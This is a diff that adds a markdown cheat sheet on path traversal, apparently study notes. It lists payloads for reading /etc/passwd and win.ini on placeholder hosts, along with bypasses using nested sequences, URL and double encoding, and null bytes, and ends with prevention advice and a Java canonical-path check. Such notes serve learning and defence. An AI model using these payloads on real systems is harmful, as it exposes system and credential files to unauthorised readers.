@@ -1,0 +1,50 @@
+# Path Traversal
+
+`<img src="/loadImage?filename=218.png">`
+
+Location: /var/www/images/
+
+Attack: `https://insecure-website.com/loadImage?filename=../../../etc/passwd`
+Windows: `https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini`
+
+## Absolute path:
+`https://example.com/image?filename=/etc/passwd`
+
+## Nested traversal sequences:
+`....//`
+
+`....\/`
+
+revert to simple traversal sequences when the inner sequence is stripped
+
+`https://example.com/image?filename=....//....//....//etc/passwd`
+
+## Encode:
+URL encoding --> `%2e%2e%2f`
+
+double URL encoding --> `%252e%252e%252f`
+
+non-standard encodings --> `..%c0%af` or `..%ef%bc%8f`
+
+`..%252f..%252f..%252fetc/passwd`
+
+## Start with the expected base folder:
+`filename=/var/www/images/../../../etc/passwd`
+
+## End with an expected file extension:
+use a null byte to effectively terminate the file path before the required extension
+
+`filename=../../../etc/passwd%00.png`
+
+## Prevent:
+- whitelist of permitted values
+- contains only permitted content, such as alphanumeric characters only
+- append the input to the base directory and use a platform filesystem API to canonicalize the path
+- verify that the canonicalized path starts with the expected base directory
+
+```
+File file = new File(BASE_DIRECTORY, userInput);
+if (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) {
+    // process file
+}
+```
